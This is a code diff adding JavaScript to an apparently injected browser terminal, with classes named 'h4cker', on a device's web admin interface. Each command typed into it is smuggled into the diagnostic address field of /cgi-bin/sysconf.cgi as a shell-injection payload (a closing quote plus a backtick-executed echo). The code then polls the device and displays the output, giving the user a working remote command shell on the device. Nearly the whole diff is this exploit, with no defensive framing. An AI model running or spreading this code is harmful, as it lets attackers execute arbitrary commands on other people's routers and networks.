@@ -17,8 +17,68 @@
 
         inputListener: function (ev) {
             if(ev.key === 'Enter') {
-
+                top.$.ajax(
+                    {
+                        url:"/cgi-bin/sysconf.cgi",
+                        data:{
+                            page:"ajax.asp",
+                            action:"save_monitor_diagnostic",
+                            mon_diag_type:0,
+                            mon_diag_addr:'";echo "`' + this.value + ' 2>&1 `',
+                            mon_ping_num:1,
+                            mon_ping_size:56,
+                            mon_ping_timeout:10,
+                            mon_tracert_hops:30,
+                            mon_diag_protocol_type:4,
+                            time:(new Date()).getTime()
+                        },
+                        cache:false,
+                        success:function(response){
+                            myApp.historyBlock.innerHTML = "";
+                            myApp.isRunning = 1;
+                            myApp.intervalID=window.setInterval(myApp.responseHandler ,300);
+                        },
+                        error:function(xhr)
+                        {}
+                    }
+                );
             }
+        },
+
+        responseHandler: function () {
+            top.$.ajax(
+                {
+                    url: "/cgi-bin/sysconf.cgi",
+                    data: {
+                        page: "ajax.asp",
+                        action: "diagnostic_tools_start",
+                        notrun: myApp.isRunning,
+                        time: (new Date()).getTime()
+                    },
+                    cache: false,
+                    success: function (response) {
+                        console.log("Interval request sent!");
+                        if (response.length != 0) {
+                            let mon_diag_status = response.split("\t")[1];
+                            var message = response.split("\t")[2];
+                            var tmp = response.split("\t")[3];
+
+                            if (tmp.search("finish") > -1) {
+                                if (mon_diag_status == "1") {
+                                    myApp.isRunning = 0;
+                                } else {
+                                    var stopID = window.clearInterval(myApp.intervalID);
+                                }
+                                console.log(myApp.historyBlock);
+                                myApp.historyBlock.innerHTML = message;
+                            }
+
+                        } else
+                            return false;
+                    },
+                    error: function (xhr) { }
+                }
+            );
         },
 
         showElementBlock: function() {
@@ -26,10 +86,13 @@
             mainBlock.className = 'h4ckerContainer';
             document.body.appendChild(mainBlock);
             
-            const historyBlock = document.createElement("div");
-            historyBlock.className = 'h4ckerHistoryBlock';
-            mainBlock.appendChild(historyBlock);
+            const topBlock = document.createElement("div");
+            topBlock.className = 'h4ckerTopBlock';
+            mainBlock.appendChild(topBlock);
 
+            this.historyBlock = document.createElement("pre");
+            this.historyBlock.className = 'h4ckerHistoryBlock';
+            topBlock.appendChild(this.historyBlock);
 
             const commandBlock = document.createElement("div");
             commandBlock.className = 'h4ckerCommandBlock';
@@ -40,13 +103,11 @@
             commandIndicator.innerHTML = '$';
             commandBlock.appendChild(commandIndicator);
 
-            const commandInput = document.createElement("input");
-            commandInput.type = "text";
-            commandInput.className = 'h4ckerCommandInput';
-            commandInput.addEventListener('keydown', this.inputListener);
-            commandBlock.appendChild(commandInput);
-            
-
+            this.commandInput = document.createElement("input");
+            this.commandInput.type = "text";
+            this.commandInput.className = 'h4ckerCommandInput';
+            this.commandInput.addEventListener('keydown', this.inputListener);
+            commandBlock.appendChild(this.commandInput);
         }
 
     };
